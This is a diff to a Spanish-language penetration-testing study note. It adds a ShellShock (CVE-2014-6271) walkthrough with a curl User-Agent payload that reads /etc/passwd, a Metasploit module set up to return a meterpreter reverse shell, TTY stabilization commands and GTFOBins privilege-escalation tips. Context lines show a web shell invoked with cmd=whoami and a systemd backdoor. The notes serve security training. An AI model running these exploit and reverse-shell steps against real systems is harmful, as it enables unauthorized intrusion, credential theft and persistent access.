@@ -108,6 +108,34 @@ upload shell.php /var/www/html/
 curl http://<target>/shell.php?cmd=whoami
 ```
 
+> [!tip] ESTABILIZAR LA SHELL (TTY)
+> Tras cualquier reverse shell, mejorar a interactiva:
+> `python3 -c 'import pty; pty.spawn("/bin/bash")'` → `Ctrl+Z` → `stty raw -echo; fg`
+> Alternativas: `script -qc /bin/bash /dev/null`, `socat`. Ver [[Reverse Shells y Post-Explotación]].
+
+### ShellShock (CVE-2014-6271) — BLOQUE 5
+
+Explota el componente CGI de Apache: ejecución de código arbitrario vía **variables de entorno HTTP** inyectadas (`User-Agent`, `Referer`...).
+
+```bash
+# Paso 1: fingerprinting — Nikto revela /cgi-bin/status
+nikto -h http://<target>
+
+# Paso 2: verificación manual con cURL
+curl -A '() { :;}; /bin/cat /etc/passwd' http://<target>/cgi-bin/status
+# Si responde con /etc/passwd → confirmado
+
+# Paso 3: reverse shell con Metasploit
+msfconsole
+search shellshock
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set RHOSTS <target>
+set TARGETURI /cgi-bin/status
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST tun0
+run
+```
+
 ### Explotar Servicios
 
 ```bash
@@ -153,6 +181,9 @@ getcap -r / 2>/dev/null
 ```
 
 ### Técnicas Comunes
+
+> [!important] GTFOBins
+> Ante cualquier binario permitido por `sudo -l` o con SUID: **[gtfobins.github.io](https://gtfobins.github.io)** es la referencia para comprobar si existe escape a shell privilegiada. Error típico: olvidar anteponer `sudo` al payload de escape — el binario de sudoers solo da privilegios si se invoca con `sudo`.
 
 | Vector          | Herramienta                        |               |
 | --------------- | ---------------------------------- | ------------- |
@@ -213,6 +244,11 @@ systemctl enable backdoor
 - [ ] Acceso obtenido
 - [ ] Escalada de privilegios completada
 - [ ] Persistencia configurada
+- [ ] Shell estabilizada (TTY) tras la reverse shell
+- [ ] ShellShock (CVE-2014-6271) reconocido y explotable
+- [ ] GTFOBins consultado ante cada sudo/SUID
+
+
 
 
 
@@ -226,17 +262,15 @@ systemctl enable backdoor
 
 ### Documentos Relacionados
 
-- [[../../apuntes evolve/BLOQUE 7.md|BLOQUE 7]] — Escalada de Privilegios, Forense Digital, Pivoting / Movilidad Lateral
-- [[../comandos/Netcat.md|Netcat]] — Escalada de Privilegios, Forense Digital, Metasploit
-- [[../11 - Forense Digital/Análisis Forense y Memoria.md|Análisis Forense y Memoria]] — Escalada de Privilegios, Forense Digital, Pivoting / Movilidad Lateral
-- [[../02 - Sistemas Operativos/Linux - Comandos Avanzados de Pentesting.md|Linux - Comandos Avanzados de Pentesting]] — Escalada de Privilegios, Forense Digital, Pivoting / Movilidad Lateral
-- [[../09 - Pivoting y Movilidad Lateral/Pivoting y Movilidad Lateral.md|Pivoting y Movilidad Lateral]] — Escalada de Privilegios, Forense Digital, Pivoting / Movilidad Lateral
-- [[../comandos/Metasploit.md|Metasploit]] — Escalada de Privilegios, Forense Digital, Metasploit
+- [[../../apuntes evolve/BLOQUE 7.md|BLOQUE 7]] — Linux, Linux, Netcat / Reverse Shells
+- [[../09 - Pivoting y Movilidad Lateral/Pivoting y Movilidad Lateral.md|Pivoting y Movilidad Lateral]] — Desarrollo Web, Linux, Netcat / Reverse Shells
+- [[../02 - Sistemas Operativos/Linux - Comandos Avanzados de Pentesting.md|Linux - Comandos Avanzados de Pentesting]] — Linux, Linux, Netcat / Reverse Shells
+- [[../../apuntes Andres/07.07.2026 Explotación Avanzada - Escalada de Privilegios MultiPivote.md|07.07.2026 Explotación Avanzada - Escalada de Privilegios MultiPivote]] — Desarrollo Web, Linux, Netcat / Reverse Shells
+- [[../../apuntes Andres/08.07.2026 Path Traversal, LFI y Escalada - Máquina Banco.md|08.07.2026 Path Traversal, LFI y Escalada - Máquina Banco]] — Desarrollo Web, Linux, Netcat / Reverse Shells
 
-### 🛠️ Herramientas
+### 🌐 Cross-Dominio
 
-- [[comandos/Metasploit|Metasploit]]
-- [[comandos/Metasploit|Netcat / Reverse Shells]]
-- [[comandos/SSH|SSH]]
+- [[../../../programacion/Java/seguridad_java.md|seguridad_java]] — Programacion: Desarrollo Web, Linux, SQL
+- [[../../../programacion/PHP/seguridad_php.md|seguridad_php]] — Programacion: Desarrollo Web, Redes, SQL
 
-> #escalada-privilegios #forense #linux #metasploit #netcat #pivoting #post-explotacion #redes #reverse-shell #ssh
+> #cli #escalada_privilegios #forense #java #linux #linux_ciber #metasploit #netcat #pivoting #redes #reverse_shell #sql #ssh_tool #web
